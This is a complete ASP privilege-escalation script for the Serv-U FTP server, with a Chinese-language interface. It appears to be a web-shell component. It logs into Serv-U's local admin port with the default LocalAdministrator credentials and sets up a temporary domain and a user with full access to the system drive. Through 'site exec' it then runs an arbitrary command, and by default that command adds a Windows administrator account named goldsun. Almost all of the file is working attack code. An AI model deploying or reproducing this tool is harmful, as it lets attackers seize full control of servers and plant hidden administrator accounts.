<% 
'Serv-U asp 提权程序
'author: Goldsun[at]84823714
'DO NOT use it to do evil things!

Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
dim action
action=request("action")
if  not isnumeric(action) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
   f=left(f,2)
end if
ftpport = 65500
timeout=3

loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case action
case 1
    set a=Server.CreateObject("Microsoft.XMLHTTP")
    a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
    a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
    set session("a")=a
%>
<form method="post" name="goldsun">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="2"></form>
<script language="javascript">
document.write('<center>正在连接 127.0.0.1:<%=port%>,使用用户名: <%=user%>,口令：<%=pass%>...<center>');
setTimeout("document.all.goldsun.submit();",4000);
</script>
<%
case 2
    set b=Server.CreateObject("Microsoft.XMLHTTP")
    b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
    b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
   set session("b")=b
%>
<form method="post" name="goldsun">
<input name="u" type="hidden" id="u" value="<%=user%>"></td>
<input name="p" type="hidden" id="p" value="<%=pass%>"></td>
<input name="port" type="hidden" id="port" value="<%=port%>"></td>
<input name="c" type="hidden" id="c" value="<%=cmd%>" size="50">
<input name="f" type="hidden" id="f" value="<%=f%>" size="50">
<input name="action" type="hidden" id="action" value="3"></form>
<script language="javascript">
document.write('<center>正在提升权限,请等待...,<center>');
setTimeout("document.all.goldsun.submit();",4000);
</script>
<%
case 3
    set c=Server.CreateObject("Microsoft.XMLHTTP")
    c.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
    c.send loginuser & loginpass & mt & deldomain & quit
    set session("c")=c
%>
<center>提权完毕,已执行了命令：<br><font color=red><%=cmd%></font><br><br>
<input type=button value=" 返回继续 " onClick="location.href='<%=gname()%>';">
</center>

<%
case else
on error resume next
    set a=session("a")
    set b=session("b")
    set c=session("c")
    a.abort
    Set a = Nothing
    b.abort
    Set b = Nothing
    c.abort
    Set c = Nothing
%>
<center><form method="post" name="goldsun">
<table width="494" height="163" border="1" cellpadding="0" cellspacing="1" bordercolor="#666666">
  <tr align="center" valign="middle">
    <td colspan="2">Serv-U 提升权限 ASP版 Goldsun[at]84823714</td>
  </tr>
  <tr align="center" valign="middle">
    <td width="100">用户名:</td>
    <td width="379"><input name="u" type="text" id="u" value="LocalAdministrator"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>口　令：</td>
    <td><input name="p" type="text" id="p" value="#l@$ak#.lk;0@P"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>端　口：</td>
    <td><input name="port" type="text" id="port" value="43958"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>系统路径：</td>
    <td><input name="f" type="text" id="f" value="<%=f%>" size="8"></td>
  </tr>
  <tr align="center" valign="middle">
    <td>命　令：</td>
    <td><input name="c" type="text" id="c" value="cmd /c net user goldsun love /add & net localgroup administrators goldsun /add" size="50"></td>
  </tr>
 
  <tr align="center" valign="middle">
    <td colspan="2"><input type="submit" name="Submit" value="提交">　
      <input type="reset" name="Submit2" value="重置">
      <input name="action" type="hidden" id="action" value="1"></td>
  </tr>
</table></form></center>
<% end select
function Gpath()
on error resume next
    err.clear
    set f=Server.CreateObject("Scripting.FileSystemObject")
    if err.number>0 then
	gpath="c:"
        exit function
    end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
Function GName() 
If request.servervariables("SERVER_PORT")="80" Then 
GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name")) 
Else 
GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name")) 
End If 
End Function 
%>